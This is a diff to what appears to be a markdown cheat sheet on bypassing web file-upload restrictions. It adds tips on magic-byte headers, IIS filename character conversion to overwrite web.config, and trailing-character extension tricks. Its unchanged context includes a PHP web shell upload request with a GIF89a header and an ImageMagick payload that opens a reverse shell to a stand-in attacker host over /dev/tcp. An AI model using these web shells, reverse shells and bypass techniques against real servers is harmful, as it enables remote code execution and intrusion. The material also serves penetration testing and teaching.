@@ -45,7 +45,14 @@ Content-Type: image/jpeg
     - file.png.jpg.php
     - file.php%00.png%00.jpg
   - Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)
-3.Bypass with file type headers. Usually, if an upload function accepts images, it will accept GIF files as well. We can add GIF89a; to the beginning of the shell to trick the upload
+
+3.Bypass file type headers. Usually if an upload function accepts images, it will accept GIF files as well. We can add GIF89a; to the beginning of the shell to trick the upload, dont forget to change the content-type to image/gif
+
+Other usefull extension
+  - JPEG, JPE, JPG:         "Exif" "JFIF" etc.
+  - gif:                    ”GIF89a”
+  - zip:                    ”Zip Compressed”
+  - doc;.xls;.xlt;.ppt;.apr:”MS Compound Document v1 or Lotus Approach APRfile”
 ```
 POST /images/upload/ HTTP/1.1
 Host: target.com
@@ -57,7 +64,6 @@ Content-Type: image/gif
 
 GIF89a; <?php system($_GET['cmd']); ?>
 ```
-And dont forget to change the content-type to image/gif
 
 ## Other Tricks
 
@@ -109,6 +115,10 @@ And dont forget to change the content-type to image/gif
       fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
       pop graphic-context
         ```
+12. Try finding characters that are converted to other useful characters during the file upload process.
+    - For instance, when running PHP on IIS, the “>”, “<”, and double quote “ characters respectively convert to “?”, “*”, and “.” characters that can be used to replace existing files (e.g. “web<<” can replace the “web.config” file). In order to include the double quote character in the filename in a normal file upload request, the filename in the “Content-Disposition” header should use single quotes (e.g. filename=’web”config’ to replace the “web.config” file).
+13. Try adding neutral characters after the filename 
+    - Special characters like spaces or dots in Windows or dots and slashes in a Linux at the end of a filename will be removed automatically (e.g. “shell.aspx … … . . .. ..”, “script.asp “, or “file.asp.”). Although slash or backslash characters are unlikely to succeed as they are normally used to separate directories, they are worth a try (e.g. “shell.php/” or “scri[t.php.\”).
   
 ## What can achive by uploading
   
@@ -142,3 +152,4 @@ And dont forget to change the content-type to image/gif
 ## Reference
   
 - https://book.hacktricks.xyz/pentesting-web/file-upload#wget-file-upload-ssrf-trick
+- https://steflan-security.com/file-upload-restriction-bypass-cheat-sheet/
